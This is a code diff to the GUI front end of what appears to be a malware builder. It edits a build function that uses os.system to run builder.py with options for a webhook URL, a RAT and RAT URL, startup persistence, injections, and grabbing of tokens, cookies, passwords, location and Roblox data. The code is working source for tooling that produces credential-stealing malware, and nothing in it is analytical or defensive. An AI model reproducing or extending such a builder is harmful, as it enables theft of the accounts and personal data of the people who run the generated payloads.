@@ -156,10 +156,13 @@ async def test_webhook(webhook_url):
         return 1
             
 def __build():
+    global xraturl 
     path = f'{Path(__file__).resolve().parent}\\builder.py'
     print(path)
-    os.system(f"start /wait cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox}")
-    #xwehookurl, xrat, xraturl, xstartup, xinjections, xtoken, xcookie, xpassword, xmalicious, xlocation, xroblox
+    if xraturl == "":
+        xraturl = ".rat"
+    msg = f"start cmd /k py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox}"
+    os.system(msg)
     ui.notify("Build has finished!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
                     
 def _makebuild():
